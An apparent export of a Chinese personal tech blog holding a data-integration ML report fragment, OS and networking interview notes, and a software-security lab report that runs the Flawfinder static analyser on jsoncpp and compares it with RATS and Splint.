<td>0.3109</td>
<td>0.3108</td>
<td align="center">0.3932</td>
</tr>
<tr>
<td align="center">神经网络</td>
<td align="center">0.6800</td>
<td align="center">0.6474</td>
<td align="center">0.6800</td>
<td align="center">0.9003</td>
<td>0.6506</td>
<td></td>
<td></td>
<td align="center">0.3694</td>
</tr>
</tbody></table>
<h3 id="六-模型应用"><a href="#六-模型应用" class="headerlink" title="六 模型应用"></a>六 模型应用</h3><p>​	对测试数据进行预处理（包括缺失值处理、数据转化、数据标准化）后，使用模型预测最终测试集（即未知的数据，’star_level’和’credit_level’是-1的），并将结果保存至resources&#x2F;predict&#x2F;中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 模型应用</span></span><br><span class="line">   label = category[<span class="number">0</span>]+<span class="string">&#x27;_level&#x27;</span></span><br><span class="line">   predictions_test = model.predict(test.drop([<span class="string">&#x27;uid&#x27;</span>, label], axis=<span class="number">1</span>))</span><br><span class="line">   <span class="comment"># 对预测结果进行处理</span></span><br><span class="line">   predictions_test = predictions_test.astype(<span class="built_in">int</span>)</span><br><span class="line">   <span class="comment"># 如果是XGBoost模型要将其映射回去</span></span><br><span class="line">   <span class="keyword">if</span> category[<span class="number">1</span>] == <span class="string">&#x27;XGBoost&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> category[<span class="number">0</span>] == <span class="string">&#x27;star&#x27;</span>:</span><br><span class="line">           <span class="comment"># 定义映射关系</span></span><br><span class="line">           label_map = &#123;<span class="number">0</span>: <span class="number">1</span>, <span class="number">1</span>: <span class="number">2</span>, <span class="number">2</span>: <span class="number">3</span>, <span class="number">3</span>: <span class="number">4</span>, <span class="number">4</span>: <span class="number">5</span>, <span class="number">5</span>: <span class="number">6</span>, <span class="number">6</span>: <span class="number">7</span>, <span class="number">7</span>: <span class="number">8</span>, <span class="number">8</span>: <span class="number">9</span>&#125;</span><br><span class="line">       <span class="keyword">elif</span> category[<span class="number">0</span>] == <span class="string">&#x27;credit&#x27;</span>:</span><br><span class="line">           label_map = &#123;<span class="number">0</span>: <span class="number">35</span>, <span class="number">1</span>: <span class="number">50</span>, <span class="number">2</span>: <span class="number">60</span>, <span class="number">3</span>: <span class="number">70</span>, <span class="number">4</span>: <span class="number">85</span>&#125;</span><br><span class="line">       <span class="comment"># 使用列表推导式映射标签</span></span><br><span class="line">       predictions_test_mapped = [label_map[l] <span class="keyword">for</span> l <span class="keyword">in</span> predictions_test]</span><br><span class="line">       predictions_test_mapped = np.array(predictions_test_mapped)</span><br><span class="line">       test[label] = predictions_test_mapped</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       test[label] = predictions_test</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 只取uid和目标列</span></span><br><span class="line">   test = test[[<span class="string">&#x27;uid&#x27;</span>, category[<span class="number">0</span>]+<span class="string">&#x27;_level&#x27;</span>]]</span><br><span class="line">   <span class="comment"># 保存预测结果至csv 文件</span></span><br><span class="line">   test.to_csv(<span class="string">&#x27;resources/predict/&#x27;</span>+category[<span class="number">0</span>]+<span class="string">&#x27;_&#x27;</span>+category[<span class="number">1</span>]+<span class="string">&#x27;_predict.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>​	预测结果示例（逻辑回归的star预测）：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/predict_result.png" alt="predict_result"></p>
<h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">├─ pictures	                    存放文档所需的图片								</span><br><span class="line">├─ resources 					</span><br><span class="line">│   ├─ credit 					信用等级相关数据</span><br><span class="line">│   ├─ evaluation results		模型评估结果</span><br><span class="line">│   ├─ feature					特征工程结果</span><br><span class="line">│   ├─ inventory				数据盘点结果</span><br><span class="line">│   ├─ pickle								</span><br><span class="line">│   ├─ predict					预测分类结果</span><br><span class="line">│   ├─ raw data					原始数据</span><br><span class="line">│   └─ star						客户星级相关数据</span><br><span class="line">├─ util							工具类					</span><br><span class="line">├─ inventory<span class="selector-class">.py</span>					数据盘点</span><br><span class="line">├─ merge<span class="selector-class">.py</span>						表合并</span><br><span class="line">├─ model<span class="selector-class">.py</span>						模型训练、应用</span><br><span class="line">├─ nn_model<span class="selector-class">.py</span>					神经网络模型</span><br><span class="line">├─ preprocess<span class="selector-class">.py</span>				预处理</span><br><span class="line">├─ select_feature<span class="selector-class">.py</span>			特征工程与特征选择</span><br><span class="line">└─ 数据集成实验报告<span class="selector-class">.md</span></span><br><span class="line">└─ 数据集成实验报告.pdf</span><br></pre></td></tr></table></figure>

<h3 id="团队分工"><a href="#团队分工" class="headerlink" title="团队分工"></a>团队分工</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>学号</th>
<th>分工</th>
</tr>
</thead>
<tbody><tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>模型训练、模型评估、模型应用</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>数据收集、数据预处理</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>特征工程、特征选择</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>模型训练、模型评估、模型应用</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>数据盘点与可视化</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>数据集成</category>
      </categories>
      <tags>
        <tag>数据集成</tag>
        <tag>数据预处理</tag>
        <tag>特征工程</tag>
        <tag>模型</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机操作系统面经</title>
    <url>/2025/02/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<h3 id="进程-vs-线程的区别"><a href="#进程-vs-线程的区别" class="headerlink" title="进程 vs. 线程的区别"></a><strong>进程 vs. 线程的区别</strong></h3><table>
<thead>
<tr>
<th><strong>对比维度</strong></th>
<th><strong>进程（Process）</strong></th>
<th><strong>线程（Thread）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>基本概念</strong></td>
<td>进程是 <strong>资源分配的最小单位</strong>，代表一个程序的运行实例。</td>
<td>线程是 <strong>CPU 调度的最小单位</strong>，是进程内部的执行单元。</td>
</tr>
<tr>
<td><strong>资源</strong></td>
<td>进程有 <strong>独立的地址空间</strong>，拥有自己的<strong>堆、栈、数据段</strong>等资源。</td>
<td>线程<strong>共享</strong>进程的资源（如内存、文件句柄等），但有自己<strong>独立的栈和寄存器</strong>。</td>
</tr>
<tr>
<td><strong>开销</strong></td>
<td>创建、销毁进程需要<strong>分配和回收资源</strong>，<strong>开销较大</strong>。</td>
<td>线程创建、销毁<strong>开销较小</strong>，因为它共享进程的资源。</td>
</tr>
<tr>
<td><strong>切换开销</strong></td>
<td>进程切换涉及 <strong>页表切换、资源回收与分配</strong>，<strong>上下文切换成本高</strong>。</td>
<td>线程切换只涉及 <strong>寄存器、栈指针</strong> 的切换，<strong>上下文切换成本较低</strong>。</td>
</tr>
<tr>
<td><strong>通信方式</strong></td>
<td>进程间通信（IPC，如管道、消息队列、共享内存等）<strong>复杂</strong>，需要操作系统支持。</td>
<td>线程间通信（共享全局变量、锁等）<strong>简单</strong>，但需要同步控制（如 <code>synchronized</code>、<code>Lock</code>）。</td>
</tr>
<tr>
<td><strong>稳定性</strong></td>
<td>一个进程崩溃不会影响其他进程，<strong>稳定性高</strong>。</td>
<td>线程共享进程资源，一个线程崩溃可能影响整个进程，<strong>稳定性较低</strong>。</td>
</tr>
<tr>
<td><strong>并发性</strong></td>
<td>进程<strong>并行执行</strong>（多个 CPU 核心可同时执行多个进程）。</td>
<td>线程<strong>并发执行</strong>（多个线程共享 CPU 资源，提高执行效率）。</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="PCB-进程控制块"><a href="#PCB-进程控制块" class="headerlink" title="PCB 进程控制块"></a>PCB 进程控制块</h3><p><strong>PCB（Process Control Block）</strong> 即进程控制块，是操作系统中用来管理和跟踪进程的数据结构，每个进程都对应着一个独立的 PCB。你可以将 PCB 视为进程的大脑。</p>
<p>当操作系统创建一个新进程时，会为该进程分配一个唯一的进程 ID，并且为该进程创建一个对应的进程控制块。当进程执行时，PCB 中的信息会不断变化，操作系统会根据这些信息来管理和调度进程。</p>
<p>PCB 主要包含下面几部分的内容：</p>
<ul>
<li>进程的描述信息，包括进程的名称、标识符等等；</li>
<li>进程的调度信息，包括进程阻塞原因、进程状态（就绪、运行、阻塞等）、进程优先级（标识进程的重要程度）等等；</li>
<li>进程对资源的需求情况，包括 CPU 时间、内存空间、I&#x2F;O 设备等等。</li>
<li>进程打开的文件信息，包括文件描述符、文件类型、打开模式等等。</li>
<li>处理机的状态信息（由处理机的各种寄存器中的内容组成的），包括通用寄存器、指令计数器、程序状态字 PSW、用户栈指针</li>
</ul>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验一——实验报告</title>
    <url>/2024/12/14/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1%E2%80%94%E2%80%94%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h4 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h4><ol>
<li>使用Flawfinder(<a href="http://www.dwheeler.com/flawfinder)%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%AF%B9C/C++%E5%AE%9E%E7%8E%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%E8%BF%9B%E8%A1%8C%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E3%80%82">http://www.dwheeler.com/flawfinder)工具，对C/C++实现的软件进行静态分析。</a></li>
<li>搜集并了解其他的C&#x2F;C++代码分析工具，如RATS、Splint等，比较这些工具的功能。</li>
</ol>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><ol>
<li><p>从Github上下载<code>jsoncpp</code>的源码（<a href="https://github.com/open-source-parsers/jsoncpp%EF%BC%89%E4%BD%9C%E4%B8%BA%E5%AE%9E%E9%AA%8C%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%85%B6%E4%B8%AD%60jsoncpp%60">https://github.com/open-source-parsers/jsoncpp）作为实验对象，其中`jsoncpp`</a> 是一个常用的 C++ 库，用于解析、生成和操作 JSON 数据，在Github上该库拥有8.2k stars和2.6k forks。</p>
</li>
<li><p>使用pip下载安装flawfinder。</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> flawfinder</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用flawfinder对<code>jsoncpp</code>的源码进行静态分析。</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">flawfinder jsoncpp-<span class="literal">master</span></span><br></pre></td></tr></table></figure></li>
</ol>
<span id="more"></span>

<h4 id="实验结果截图"><a href="#实验结果截图" class="headerlink" title="实验结果截图"></a>实验结果截图</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241127221745688.png" alt="image-20241127221745688"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241127221641020.png" alt="image-20241127221641020"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241127221702938.png" alt="image-20241127221702938"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241127221541529.png" alt="image-20241127221541529"></p>
<h4 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h4><ol>
<li><p><strong>Hits &#x3D; 74</strong><br>发现的潜在问题总数为 74 个（即代码中有 74 个位置可能存在安全隐患）。</p>
<p><strong>Lines analyzed &#x3D; 12575</strong><br>分析的代码行总数为 12,575 行（包括注释、空行和实际代码），分析花费的时间为0.30秒。</p>
<p><strong>Physical Source Lines of Code (SLOC) &#x3D; 9707</strong><br>物理代码行数（不包括注释和空白行）为 9,707 行，表示实际有效的代码内容。</p>
</li>
<li><p><strong>Hits@level</strong></p>
<p>这是根据问题的风险级别对 Hits 的分类：</p>
<ul>
<li><strong>[0] 25</strong>：25 个潜在问题的风险级别为 0（最低风险）。</li>
<li><strong>[1] 60</strong>：60 个潜在问题的风险级别为 1（低风险）。</li>
<li><strong>[2] 10</strong>：10 个潜在问题的风险级别为 2（中等风险）。</li>
<li><strong>[3] 0</strong>：0 个潜在问题的风险级别为 3（高风险）。</li>
<li><strong>[4] 4</strong>：4 个潜在问题的风险级别为 4（较高风险）。</li>
<li><strong>[5] 0</strong>：0 个潜在问题的风险级别为 5（最高风险，通常会造成严重安全漏洞）。</li>
</ul>
</li>
<li><p><strong>Hits&#x2F;KSLOC@level+</strong></p>
<p>表示每千行代码（KLOC）对应的风险问题数：</p>
<ul>
<li><strong>[0+] 10.1988</strong>：每千行代码的风险级别为 0 及以上的问题数约为 10.20。</li>
<li><strong>[1+] 7.62336</strong>：每千行代码的风险级别为 1 及以上的问题数约为 7.62。</li>
<li><strong>[2+] 1.44226</strong>：每千行代码的风险级别为 2 及以上的问题数约为 1.44。</li>
<li><strong>[3+] 0.412074</strong>：每千行代码的风险级别为 3 及以上的问题数约为 0.41。</li>
<li><strong>[4+] 0.412074</strong>：每千行代码的风险级别为 4 及以上的问题数约为 0.41。</li>
<li><strong>[5+] 0</strong>：每千行代码的风险级别为 5 的问题数为 0。</li>
</ul>
</li>
<li><p>flawfinder还给出了所有风险级别 1 及以上的所有问题，例如：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241127223211077.png" alt="image-20241127223211077"></p>
<p>这一段显示了在代码的<code>./inclue\json\config.h:65</code>中，存在一个关于<code>snprintf</code>的问题——如果格式字符串可以被攻击者影响，则可能被利用；此外，sprintf 的变体不总是以”\0”结尾（此外还给出了该漏洞属于CWE-134）。并给出了建议——应使用常量作为格式说明符。</p>
<p>总结之后可归纳出在代码中存在的所有问题类型和出现次数为以下：</p>
<ul>
<li><p><strong>(format) snprintf (等级4)，共1次</strong></p>
<p>问题描述：如果格式字符串可以被攻击者影响，则可能被利用；此外，<code>sprintf</code> 的变体不总是以<code>\0</code>结尾（CWE-134）。应使用常量作为格式说明符。</p>
</li>
<li><p><strong>(buffer) sscanf (等级4)，共3次</strong></p>
<p>问题描述：<code>scanf</code>系列的<code>%s</code>操作如果没有指定限制，可能导致缓冲区溢出（CWE-120, CWE-20）。应为<code>%s</code>指定限制，或使用其他输入函数。</p>
</li>
<li><p><strong>(misc)open、 fopen(等级2)，共4次</strong></p>
<p>问题描述：打开文件时应检查，是否可能被攻击者重定向（通过符号链接），强制打开特殊文件类型（例如设备文件），通过更改文件位置制造竞争条件，控制其父目录，或更改其内容（CWE-362）。</p>
</li>
<li><p><strong>(buffer) char (等级2)，共4次</strong></p>
<p>问题描述：静态大小的数组可能由于限制不当而导致潜在的溢出或其他问题（CWE-119!&#x2F;CWE-120）。应进行边界检查，使用限制长度的函数，或确保数组大小足够容纳可能的最大长度。</p>
</li>
<li><p><strong>(buffer) memcpy (等级2)，共2次</strong></p>
<p>问题描述：在向目标复制数据时不检查缓冲区溢出（CWE-120）。应确保目标始终能容纳源数据。</p>
</li>
<li><p><strong>(buffer) strlen (等级1)，共60次</strong></p>
<p>问题描述：<code>strlen</code>无法处理非<code>\0</code>结尾的字符串；如果传入这样的字符串，可能会导致过度读取（CWE-126）。在未保护的情况下可能会导致崩溃。</p>
</li>
</ul>
</li>
</ol>
<h4 id="与其他工具对比"><a href="#与其他工具对比" class="headerlink" title="与其他工具对比"></a>与其他工具对比</h4><ol>
<li><p><strong>Flawfinder</strong></p>
<p>Flawfinder 是一款专注于 C&#x2F;C++ 代码的静态分析工具，用于快速检测代码中的潜在安全问题，尤其是危险函数和常见漏洞（如缓冲区溢出）。它基于一组已知的不安全函数规则库（例如 <code>strcpy</code> 等）进行扫描，并为每个问题分配安全风险等级。Flawfinder 优势在于易用性高，能够快速分析小型和中型项目，但它的规则覆盖范围有限，对现代 C++ 特性支持较差，且容易出现误报，特别是当代码上下文未被充分理解时。</p>
</li>
<li><p><strong>RATS</strong></p>
<p>RATS（Rough Auditing Tool for Security）是一款多语言静态分析工具，支持 C&#x2F;C++、Perl、Python 和 PHP 等语言，主要通过检测已知危险函数来发现代码中的安全漏洞。与 Flawfinder 类似，RATS 的规则库也偏向基础安全问题，但其多语言支持使其在跨语言项目中具有优势。RATS 操作简单，但其检测能力受限于规则的覆盖范围，对于复杂或现代化的编程场景，效果不够理想，且误报率较高。</p>
</li>
<li><p><strong>Splint</strong></p>
<p>Splint 专注于 C 代码的静态分析，主要用于类型安全、内存管理和逻辑错误的检查。与 Flawfinder 和 RATS 不同，Splint 偏向于细致的代码质量分析而非单纯的安全漏洞检测。开发者可以通过代码注释自定义检查规则，从而增强分析深度。Splint 的特点是可以深入挖掘隐式行为和潜在问题，但它的配置较复杂，对开发者的使用门槛较高。此外，Splint 不支持现代 C++ 特性，更适用于传统的 C 项目。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>静态代码分析</tag>
        <tag>flawfinder</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络面经</title>
    <url>/2025/02/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="http-1-0-vs-http-1-1"><a href="#http-1-0-vs-http-1-1" class="headerlink" title="http&#x2F;1.0 vs http&#x2F;1.1"></a>http&#x2F;1.0 vs http&#x2F;1.1</h3><p><strong>连接方式</strong> : HTTP&#x2F;1.0 为短连接，HTTP&#x2F;1.1 支持长连接。HTTP 协议的长连接和短连接，实质上是 TCP 协议的长连接和短连接。</p>
<p><strong>状态响应码</strong> : HTTP&#x2F;1.1 中新加入了大量的状态码，光是错误响应状态码就新增了 24 种。比如说，<code>100 (Continue)</code>——在请求大资源前的预热请求，<code>206 (Partial Content)</code>——范围请求的标识码，<code>409 (Conflict)</code>——请求与当前资源的规定冲突，<code>410 (Gone)</code>——资源已被永久转移，而且没有任何已知的转发地址。</p>
<p><strong>缓存机制</strong> : 在 HTTP&#x2F;1.0 中主要使用 Header 里的 If-Modified-Since,Expires 来做为缓存判断的标准，HTTP&#x2F;1.1 则引入了更多的缓存控制策略例如 Entity tag，If-Unmodified-Since, If-Match, If-None-Match 等更多可供选择的缓存头来控制缓存策略。</p>
<p><strong>带宽</strong>：HTTP&#x2F;1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP&#x2F;1.1 则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码是 206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p>
<p><strong>Host 头（Host Header）处理</strong> :HTTP&#x2F;1.1 引入了 Host 头字段，允许在同一 IP 地址上托管多个域名，从而支持虚拟主机的功能。而 HTTP&#x2F;1.0 没有 Host 头字段，无法实现虚拟主机。</p>
<h3 id="http-1-1-vs-http-2-0"><a href="#http-1-1-vs-http-2-0" class="headerlink" title="http&#x2F;1.1 vs http&#x2F;2.0"></a>http&#x2F;1.1 vs http&#x2F;2.0</h3><p><strong>多路复用（Multiplexing）</strong>：HTTP&#x2F;2.0 在同一连接上可以同时传输多个请求和响应（可以看作是 HTTP&#x2F;1.1 中长链接的升级版本），互不干扰。HTTP&#x2F;1.1 则使用串行方式，每个请求和响应都需要独立的连接，而浏览器为了控制资源会有 6-8 个 TCP 连接的限制。。这使得 HTTP&#x2F;2.0 在处理多个请求时更加高效，减少了网络延迟和提高了性能。</p>
<p><strong>二进制帧（Binary Frames）</strong>：HTTP&#x2F;2.0 使用二进制帧进行数据传输，而 HTTP&#x2F;1.1 则使用文本格式的报文。二进制帧更加紧凑和高效，减少了传输的数据量和带宽消耗。</p>
<p><strong>头部压缩（Header Compression）</strong>：HTTP&#x2F;1.1 支持<code>Body</code>压缩，<code>Header</code>不支持压缩。HTTP&#x2F;2.0 支持对<code>Header</code>压缩，使用了专门为<code>Header</code>压缩而设计的 HPACK 算法，减少了网络开销。</p>
<p><strong>服务器推送（Server Push）</strong>：HTTP&#x2F;2.0 支持服务器推送，可以在客户端请求一个资源时，将其他相关资源一并推送给客户端，从而减少了客户端的请求次数和延迟。而 HTTP&#x2F;1.1 需要客户端自己发送请求来获取相关资源。</p>
<h3 id="http-2-0-vs-http-3-0"><a href="#http-2-0-vs-http-3-0" class="headerlink" title="http&#x2F;2.0 vs http&#x2F;3.0"></a>http&#x2F;2.0 vs http&#x2F;3.0</h3><p><strong>传输协议</strong>：HTTP&#x2F;2.0 是基于 TCP 协议实现的，HTTP&#x2F;3.0 新增了 QUIC（Quick UDP Internet Connections） 协议来实现可靠的传输，提供与 TLS&#x2F;SSL 相当的安全性，具有较低的连接和传输延迟。你可以将 QUIC 看作是 UDP 的升级版本，在其基础上新增了很多功能比如加密、重传等等。HTTP&#x2F;3.0 之前名为 HTTP-over-QUIC，从这个名字中我们也可以发现，HTTP&#x2F;3 最大的改造就是使用了 QUIC。</p>
<p><strong>连接建立</strong>：HTTP&#x2F;2.0 需要经过经典的 TCP 三次握手过程（由于安全的 HTTPS 连接建立还需要 TLS 握手，共需要大约 3 个 RTT）。由于 QUIC 协议的特性（TLS 1.3，TLS 1.3 除了支持 1 个 RTT 的握手，还支持 0 个 RTT 的握手）连接建立仅需 0-RTT 或者 1-RTT。这意味着 QUIC 在最佳情况下不需要任何的额外往返时间就可以建立新连接。</p>
<p><strong>头部压缩</strong>：HTTP&#x2F;2.0 使用 HPACK 算法进行头部压缩，而 HTTP&#x2F;3.0 使用更高效的 QPACK 头压缩算法。</p>
<p><strong>队头阻塞</strong>：HTTP&#x2F;2.0 多请求复用一个 TCP 连接，一旦发生丢包，就会阻塞住所有的 HTTP 请求。由于 QUIC 协议的特性，HTTP&#x2F;3.0 在一定程度上解决了队头阻塞（Head-of-Line blocking, 简写：HOL blocking）问题，一个连接建立多个不同的数据流，这些数据流之间独立互不影响，某个数据流发生丢包了，其数据流不受影响（本质上是多路复用+轮询）。</p>
<p><strong>连接迁移</strong>：HTTP&#x2F;3.0 支持连接迁移，因为 QUIC 使用 64 位 ID 标识连接，只要 ID 不变就不会中断，网络环境改变时（如从 Wi-Fi 切换到移动数据）也能保持连接。而 TCP 连接是由（源 IP，源端口，目的 IP，目的端口）组成，这个四元组中一旦有一项值发生改变，这个连接也就不能用了。</p>
<p><strong>错误恢复</strong>：HTTP&#x2F;3.0 具有更好的错误恢复机制，当出现丢包、延迟等网络问题时，可以更快地进行恢复和重传。而 HTTP&#x2F;2.0 则需要依赖于 TCP 的错误恢复机制。</p>
<p><strong>安全性</strong>：在 HTTP&#x2F;2.0 中，TLS 用于加密和认证整个 HTTP 会话，包括所有的 HTTP 头部和数据负载。TLS 的工作是在 TCP 层之上，它加密的是在 TCP 连接中传输的应用层的数据，并不会对 TCP 头部以及 TLS 记录层头部进行加密，所以在传输的过程中 TCP 头部可能会被攻击者篡改来干扰通信。而 HTTP&#x2F;3.0 的 QUIC 对整个数据包（包括报文头和报文体）进行了加密与认证处理，保障安全性。</p>
<h3 id="http-vs-https"><a href="#http-vs-https" class="headerlink" title="http vs https"></a>http vs https</h3><ol>
<li><strong>端口号</strong>：HTTP 默认是 80，HTTPS 默认是 443。</li>
<li><strong>URL 前缀</strong>：HTTP 的 URL 前缀是 <code>http://</code>，HTTPS 的 URL 前缀是 <code>https://</code>。</li>
<li><strong>安全性和资源消耗</strong>：HTTP 协议运行在 TCP 之上，所有传输的内容都是明文，客户端和服务器端都无法验证对方的身份。HTTPS 是运行在 SSL&#x2F;TLS 之上的 HTTP 协议，SSL&#x2F;TLS 运行在 TCP 之上。所有传输的内容都经过加密，加密采用对称加密，但对称加密的密钥用服务器方的证书进行了非对称加密。所以说，HTTP 安全性没有 HTTPS 高，但是 HTTPS 比 HTTP 耗费更多服务器资源。</li>
</ol>
<p>工作原理如下所示：</p>
<ol>
<li>客户端发送请求</li>
<li>服务端返回一个公钥证书，里面包含一个非对称加密的公钥，私钥则在服务端自己这</li>
<li>客户端验证证书的有效性</li>
<li>客户端利用伪随机数生成一个对称加密的密钥，并用证书中的公钥将其加密，发送给服务端</li>
<li>服务端接收到被非对称加密的公钥加密过 的 对称加密的密钥，使用自己的非对称加密的私钥将其解密，这样也得到了 对称加密的密钥</li>
<li>接下来双方使用对称加密的密钥进行加密通信</li>
</ol>
<p>即整个过程为，通过一次非对称加密来获得通信使用的对称加密的密钥。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306214611000.png" alt="image-20250306214611000"></p>
<h3 id="http常见状态码"><a href="#http常见状态码" class="headerlink" title="http常见状态码"></a>http常见状态码</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306214724326.png" alt="image-20250306214724326"></p>
<p><strong>200 OK</strong>：请求被成功处理。例如，发送一个查询用户数据的 HTTP 请求到服务端，服务端正确返回了用户数据。这个是我们平时最常见的一个 HTTP 状态码。</p>
<p><strong>201 Created</strong>：请求被成功处理并且在服务端创建了一个新的资源。例如，通过 POST 请求创建一个新的用户。</p>
<p><strong>202 Accepted</strong>：服务端已经接收到了请求，但是还未处理。例如，发送一个需要服务端花费较长时间处理的请求（如报告生成、Excel 导出），服务端接收了请求但尚未处理完毕。</p>
<p><strong>204 No Content</strong>：服务端已经成功处理了请求，但是没有返回任何内容。例如，发送请求删除一个用户，服务器成功处理了删除操作但没有返回任何内容</p>
<p><strong>301 Moved Permanently</strong>：资源被永久重定向了。比如你的网站的网址更换了。</p>
<p><strong>302 Found</strong>：资源被临时重定向了。比如你的网站的某些资源被暂时转移到另外一个网址。</p>
<p><strong>400 Bad Request</strong>：发送的 HTTP 请求存在问题。比如请求参数不合法、请求方法错误。</p>
<p><strong>401 Unauthorized</strong>：未认证却请求需要认证之后才能访问的资源。</p>
<p><strong>403 Forbidden</strong>：直接拒绝 HTTP 请求，不处理。一般用来针对非法请求。</p>
<p><strong>404 Not Found</strong>：你请求的资源未在服务端找到。比如你请求某个用户的信息，服务端并没有找到指定的用户。</p>
<p><strong>409 Conflict</strong>：表示请求的资源与服务端当前的状态存在冲突，请求无法被处理。</p>
<p><strong>500 Internal Server Error</strong>：服务端出问题了（通常是服务端出 Bug 了）。比如你服务端处理请求的时候突然抛出异常，但是异常并未在服务端被正确处理。</p>
<p><strong>502 Bad Gateway</strong>：我们的网关将请求转发到服务端，但是服务端返回的却是一个错误的响应。</p>
<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><p>WebSocket 是一种基于 TCP 连接的全双工通信协议，即客户端和服务器可以同时发送和接收数据。</p>
<p>WebSocket 协议本质上是应用层的协议，用于弥补 HTTP 协议在持久通信能力上的不足。客户端和服务器仅需一次握手，两者之间就直接可以创建持久性的连接，并进行双向数据传输。</p>
<h3 id="WebSocket与HTTP的区别"><a href="#WebSocket与HTTP的区别" class="headerlink" title="WebSocket与HTTP的区别"></a>WebSocket与HTTP的区别</h3><p>下面是二者的主要区别：</p>
<ul>
<li>WebSocket 是一种双向实时通信协议，而 HTTP 是一种单向通信协议。并且，HTTP 协议下的通信只能由客户端发起，服务器无法主动通知客户端。</li>
<li>WebSocket 使用 ws:&#x2F;&#x2F; 或 wss:&#x2F;&#x2F;（使用 SSL&#x2F;TLS 加密后的协议，类似于 HTTP 和 HTTPS 的关系） 作为协议前缀，HTTP 使用 http:&#x2F;&#x2F; 或 https:&#x2F;&#x2F; 作为协议前缀。</li>
<li>WebSocket 可以支持扩展，用户可以扩展协议，实现部分自定义的子协议，如支持压缩、加密等。</li>
<li>WebSocket 通信数据格式比较轻量，用于协议控制的数据包头部相对较小，网络开销小，而 HTTP 通信每次都要携带完整的头部，网络开销较大（HTTP&#x2F;2.0 使用二进制帧进行数据传输，还支持头部压缩，减少了网络开销）。</li>
</ul>
<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS（Domain Name System）域名管理系统，是当用户使用浏览器访问网址之后，使用的第一个重要协议。DNS 要解决的是<strong>域名和 IP 地址的映射问题</strong>。</p>
<p>目前 DNS 的设计采用的是分布式、层次数据库结构，<strong>DNS 是应用层协议，它可以在 UDP 或 TCP 协议之上运行，端口为 53</strong> 。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306223825953.png" alt="image-20250306223825953" style="zoom:50%;" />

<h2 id="TCP与UDP"><a href="#TCP与UDP" class="headerlink" title="TCP与UDP"></a>TCP与UDP</h2><h3 id="TCP与UDP的区别"><a href="#TCP与UDP的区别" class="headerlink" title="TCP与UDP的区别"></a>TCP与UDP的区别</h3><p><strong>是否面向连接</strong>：UDP 在传送数据之前不需要先建立连接。而 TCP 提供面向连接的服务，在传送数据之前必须先建立连接，数据传送结束后要释放连接。</p>
